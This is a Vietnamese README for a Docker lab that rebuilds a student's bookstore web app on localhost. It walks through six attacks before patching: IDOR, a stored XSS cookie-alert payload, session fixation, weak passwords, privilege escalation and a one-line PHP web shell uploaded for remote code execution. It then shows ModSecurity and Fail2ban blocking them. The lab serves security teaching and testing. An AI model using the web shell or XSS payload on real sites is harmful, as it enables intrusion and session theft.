# WebBook Security Lab — Đề 5: Kiểm tra & Tối ưu hóa An toàn Ứng dụng Web

Lab này dựng đúng ứng dụng "Tạp Hóa Sách" của bạn (không dùng DVWA) bằng Docker,
để thực hành khai thác lỗ hổng thật rồi vá + hardening theo đúng yêu cầu Đề 5.

## ⚠️ Trước khi chạy

File `src/index.php` hiện tại là bản **TẠM THỜI** mình tự viết (vì chưa nhận
được file `index.php` gốc — trang chủ liệt kê sách của bạn, khác với file
`index.php` bạn gửi là của khu vực admin). Nếu bạn có file gốc, hãy thay thế
`src/index.php` bằng file đó trước khi chạy để đúng 100% với hệ thống thật.

File `src/thanh_toan.php` đã có trong lab nhưng mình chưa rà lỗi kỹ file
này — nếu muốn audit luôn phần thanh toán, cứ hỏi mình ở lượt sau.

## Yêu cầu máy

- Docker + Docker Compose đã cài (`docker --version`, `docker compose version`)

## Bước 1 — Khởi động toàn bộ hạ tầng

```bash
cd webbook-lab
docker compose up -d --build
```

Chờ ~1-2 phút lần đầu (tải image MariaDB + build Apache/PHP/ModSecurity).

Kiểm tra các container đã chạy:
```bash
docker compose ps
```

## Bước 2 — Truy cập hệ thống

| Địa chỉ | Mô tả |
|---|---|
| http://localhost:8080 | Trang chủ shop (HTTP) |
| https://localhost:8443 | Trang chủ shop (HTTPS, chứng chỉ tự ký — trình duyệt sẽ cảnh báo "Not secure", chọn Advanced → Proceed) |
| http://localhost:8080/admin/index.php | Dashboard admin |
| http://localhost:8081 | Adminer (xem/sửa DB trực tiếp) — hệ thống: MySQL, máy chủ: `db`, user: `root`, mật khẩu: để trống, CSDL: `quanlybanbooks` |

**Tài khoản có sẵn trong DB mẫu** (xem bảng `nguoi_dung` qua Adminer):
- `admin` / mật khẩu `123456` (vai_tro = admin)
- `nguyenvanan` / mật khẩu `123456` (vai_tro = khach_hang, id=2 — dùng để test IDOR)
- `lethibinh` / mật khẩu `123456` (id=3)
- `Alex` / mật khẩu `123` (id=4)

> 📌 Ghi chú cho báo cáo: dòng `id=5` trong bảng `nguoi_dung` có
> `mat_khau = '123'` lưu **plaintext hoàn toàn** — đây là bằng chứng thật
> (không phải giả lập) cho lỗi "mật khẩu lưu không an toàn" đã phân tích.
> Chụp màn hình dòng này trong Adminer làm bằng chứng "trước khi vá".

## Bước 3 — Chạy 6 kịch bản tấn công (chụp bằng chứng TRƯỚC khi vá)

Mở DevTools (F12 → tab Network) hoặc Burp Suite để chụp request/response.

### 3.1 — IDOR
Không đăng nhập (hoặc trình duyệt ẩn danh), mở thẳng:
```
http://localhost:8080/xem_don_mua.php
```
→ Thấy đơn hàng của user id=2 dù không đăng nhập. Chụp response HTML +
mã 200.

### 3.2 — Stored XSS
Đăng nhập admin → `admin_quan_ly_the_loai.php` → sửa tên 1 thể loại thành:
```html
<script>alert(document.cookie)</script>
```
→ Truy cập `the_loai.php?id=<id>` → script chạy. Chụp popup alert.

### 3.3 — Session Fixation
- Mở tab ẩn danh, vào trang bất kỳ, ghi lại `PHPSESSID` (F12 → Application → Cookies).
- Đăng nhập với `nguyenvanan/123456`.
- Kiểm tra lại `PHPSESSID` → **không đổi** → session fixation xác nhận được.

### 3.4 — Mật khẩu yếu / plaintext
Vào Adminer → bảng `nguoi_dung` → chụp cột `mat_khau`: thấy MD5 (32 ký tự
hex) và dòng `id=5` là plaintext `123`.

### 3.5 — Broken Access Control (admin panel)
Đăng nhập bằng `nguyenvanan/123456` (tài khoản khách hàng thường) → mở thẳng:
```
http://localhost:8080/admin/admin_quan_ly_nguoi_dung.php
```
→ Trang tải đầy đủ dù không phải admin. Sửa chính tài khoản mình
(`vai_tro` → `admin`) → submit → giờ có toàn quyền admin. Chụp request GET
200 + đoạn form trước khi sửa.

### 3.6 — Unrestricted File Upload → RCE
Với quyền admin vừa leo thang được ở bước 3.5, vào:
```
http://localhost:8080/admin/admin_quan_ly_sach.php
```
Tạo file `shell.php`:
```php
<?php system($_GET['cmd']); ?>
```
Thêm sách mới, ở ô "Ảnh bìa sách" chọn `shell.php` → Đăng Bán Sách.
Truy cập:
```
http://localhost:8080/uploads/<timestamp>_shell.php?cmd=id
```
→ Server thực thi lệnh, trả về output của `id`. Chụp lại toàn bộ response.

## Bước 4 — Bật ModSecurity + Fail2ban rồi kiểm chứng lại (SAU khi vá)

ModSecurity CRS đã bật sẵn từ Bước 1 (SecRuleEngine On). Fail2ban chạy ở
container riêng, theo dõi log qua thư mục `apache-logs/`.

```bash
docker compose logs -f fail2ban
```

**Kiểm chứng ModSecurity chặn file upload độc hại (lặp lại 3.6):**
Upload lại `shell.php` → lần này ModSecurity CRS sẽ chặn (403) vì CRS có rule
phát hiện PHP tag `<?php` trong nội dung upload. Chụp log:
```bash
docker compose exec web tail -n 50 /var/log/apache2/modsec_audit.log
```

**Kiểm chứng Fail2ban chặn brute-force login:**
Đăng nhập sai liên tục 5-6 lần bằng `curl` hoặc form thật:
```bash
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8080/dang_nhap.php \
    -d "ten_dang_nhap=admin&mat_khau=saipass$i"
done
```
Kiểm tra IP bị ban:
```bash
docker compose exec fail2ban fail2ban-client status webbook-login
```
→ Thấy IP của bạn nằm trong "Banned IP list". Chụp lại kết quả lệnh này.

## Bước 5 — Sau khi vá code (khi bạn sẵn sàng cho mình vá — xem lượt chat kế)

Sau khi thay 18 file bằng bản đã vá, lặp lại Bước 3.1, 3.2, 3.3, 3.5 →
tất cả phải thất bại (redirect 302, script không chạy, session ID đổi khi
login...). Đây chính là cặp before/after cho "Biên bản kiểm thử".

## Dừng lab

```bash
docker compose down        # dừng, giữ dữ liệu
docker compose down -v     # dừng + xóa luôn dữ liệu DB
```
